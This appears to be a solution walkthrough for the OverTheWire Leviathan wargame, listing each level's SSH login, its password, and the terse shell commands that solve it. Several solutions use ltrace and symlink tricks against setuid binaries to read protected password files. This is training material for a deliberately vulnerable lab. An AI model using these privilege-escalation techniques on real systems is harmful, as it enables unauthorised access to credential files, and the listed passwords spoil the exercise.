# Leviathan

`ssh leviathan.labs.overthewire.org -p 2223`

## Level 0

**Credentials:**

`ssh leviathan.labs.overthewire.org -p 2223 -l leviathan0`

password: `leviathan0`

**Solution:**

    ls -la
    cat .backup/bookmarks.html | grep password

## Level 1

**Credentials:**

`ssh leviathan.labs.overthewire.org -p 2223 -l leviathan1`

password: `rioGegei8m`

**Solution:**

    ls -la
    file ./check
    ltrace ./check
    ./check
    cat /etc/leviathan_pass/leviathan2

## Level 2

**Credentials:**

`ssh leviathan.labs.overthewire.org -p 2223 -l leviathan2`

password: `ougahZi8Ta`

**Solution:**

    ls -la
    ./printfile
    ltrace ./printfile .profile
    mkdir -p /tmp/wsx2
    cd /tmp/wsx2
    touch file\ solution.txt
    ln -s /etc/leviathan_pass/leviathan3 /tmp/wsx2/file
    ~/printfile file\ solution.txt

## Level 3

**Credentials:**

`ssh leviathan.labs.overthewire.org -p 2223 -l leviathan3`

password: `Ahdiemoo1j`

**Solution:**

    ls -la
    file ./level3
    ltrace ./level3
    ./level3
    cat /etc/leviathan_pass/leviathan4

## Level 4

**Credentials:**

`ssh leviathan.labs.overthewire.org -p 2223 -l leviathan4`

password: `vuH0coox6m`

**Solution:**

    ls -la
    cd .trash
    ./bin
    CONVERT THE OUTPUT BINARY TO TEXT

## Level 5

**Credentials:**

`ssh leviathan.labs.overthewire.org -p 2223 -l leviathan5`

password: `Tith4cokei`

**Solution:**

    ls -la
    ./leviathan5
    touch /tmp/file.log
    ltrace ./leviathan5
    echo 'wsx' > /tmp/file.log
    ./leviathan5
    ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
    ./leviathan5

## Level 6

**Credentials:**

`ssh leviathan.labs.overthewire.org -p 2223 -l leviathan6`

password: `UgaoFee4li`

**Solution:**

    ls -la
    file ./leviathan6
    ltrace ./leviathan6
    ltrace ./leviathan6 1234
    mkdir -p /tmp/wsx6
    cd /tmp/wsx6
    vim exploit.sh
    chmod 700 exploit.sh
    ./exploit.sh
    cat /etc/leviathan_pass/leviathan7

THE SCRIPT CREATED CAN BE FOUND [HERE](./exploit.sh).

## Level 7

**Credentials:**

`ssh leviathan.labs.overthewire.org -p 2223 -l leviathan7`

password: `ahy7MaeBo9`
